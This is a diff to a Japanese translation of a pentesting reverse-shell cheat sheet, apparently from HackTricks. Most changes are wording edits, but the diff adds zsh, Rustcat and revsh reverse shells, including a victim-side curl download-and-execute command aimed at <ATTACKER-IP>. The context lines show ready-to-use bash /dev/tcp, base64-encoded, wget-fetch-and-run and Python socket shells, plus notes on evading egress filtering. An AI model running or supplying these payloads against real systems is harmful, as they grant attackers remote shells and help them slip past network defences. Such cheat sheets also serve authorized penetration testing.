@@ -21,7 +21,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-他のシェルも確認することを忘れないでください: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, および bash。
+他のシェルも確認するのを忘れないでください: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, および bash。
 
 ### シンボルセーフシェル
 ```bash
@@ -34,7 +34,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### シェルの説明
 
-1. **`bash -i`**: このコマンドの部分は、インタラクティブな（`-i`）Bashシェルを開始します。
+1. **`bash -i`**: このコマンドの部分は、インタラクティブ（`-i`）Bashシェルを開始します。
 2. **`>&`**: このコマンドの部分は、**標準出力**（`stdout`）と**標準エラー**（`stderr`）を**同じ宛先**にリダイレクトするための省略記法です。
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: これは、**指定されたIPアドレスとポートへのTCP接続を表す特別なファイル**です。
 - **出力とエラーストリームをこのファイルにリダイレクトすることによって**、コマンドはインタラクティブシェルセッションの出力を攻撃者のマシンに送信します。
@@ -47,11 +47,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Linuxベースのウェブアプリケーション内の**Remote Code Execution (RCE)** 脆弱性に対処する際、リバースシェルの取得は、iptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。このような制約のある環境では、PTP（擬似端末）シェルを確立して、侵害されたシステムとより効果的に対話する代替アプローチが含まれます。
+Linuxベースのウェブアプリケーション内の**Remote Code Execution (RCE)** 脆弱性に対処する際、リバースシェルの取得はiptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。このような制約のある環境では、妥協したシステムとより効果的に対話するためにPTY（擬似端末）シェルを確立する代替アプローチがあります。
 
 この目的に推奨されるツールは[toboggan](https://github.com/n3rada/toboggan.git)で、ターゲット環境との対話を簡素化します。
 
-tobogganを効果的に利用するには、ターゲットシステムのRCEコンテキストに合わせたPythonモジュールを作成します。たとえば、`nix.py`という名前のモジュールは次のように構成できます:
+tobogganを効果的に利用するには、ターゲットシステムのRCEコンテキストに合わせたPythonモジュールを作成します。例えば、`nix.py`という名前のモジュールは次のように構成できます:
 ```python3
 import jwt
 import httpx
@@ -79,7 +79,7 @@ return response.text
 ```shell
 toboggan -m nix.py -i
 ```
-インタラクティブシェルを直接利用するには、Burpsuite統合のために`-b`を追加し、より基本的なRCEラッパーのために`-i`を削除できます。
+インタラクティブシェルを直接利用するには、Burpsuite統合のために`-b`を追加し、より基本的なrceラッパーのために`-i`を削除できます。
 
 別の可能性として、`IppSec`のフォワードシェル実装を使用することができます [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。
 
@@ -124,7 +124,7 @@ while true; do nc -l <port>; done
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
-## パイソン
+## Python
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -219,9 +219,51 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (ビルトインTCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rustで書かれたモダンなnetcatのようなリスナー（2024年からKaliにパッケージされています）。
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+特徴:
+- 暗号化されたトランスポートのためのオプションの `--ssl` フラグ (TLS 1.3)
+- 被害者上で任意のバイナリを生成するための `-s` (例: `/bin/sh`, `python3`)
+- 完全にインタラクティブな PTY に自動的にアップグレードするための `--up`
+
+## revsh (暗号化およびピボット準備完了)
+
+`revsh` は、**暗号化されたDiffie-Hellmanトンネル**を介して完全なTTYを提供する小さなCクライアント/サーバーであり、オプションで**TUN/TAP**インターフェースを逆VPNのようなピボティングのために接続できます。
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+役立つフラグ:
+- `-b` : リバースの代わりにバインドシェル
+- `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKSを通じてプロキシ
+- `-t` : TUNインターフェースを作成（リバースVPN）
+
+セッション全体が暗号化されており、マルチプレックスされているため、プレーンテキストの`/dev/tcp`シェルを殺す単純な出口フィルタリングをしばしば回避します。
+
 ## OpenSSL
 
-攻撃者 (Kali)
+攻撃者（Kali）
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -296,7 +338,7 @@ close(Service)
 ```bash
 xterm -display 10.0.0.1:1
 ```
-リバースシェルをキャッチするには、次のように使用できます（ポート6001でリッスンします）：
+リバースシェルをキャッチするには、次のものを使用できます（ポート6001でリッスンします）：
 ```bash
 # Authorize host
 xhost +targetip
@@ -305,7 +347,7 @@ Xnest :1
 ```
 ## グルービー
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注: Javaリバースシェルはグルービーでも動作します
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注: Java リバースシェルはグルービーにも適用されます
 ```bash
 String host="localhost";
 int port=8044;
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
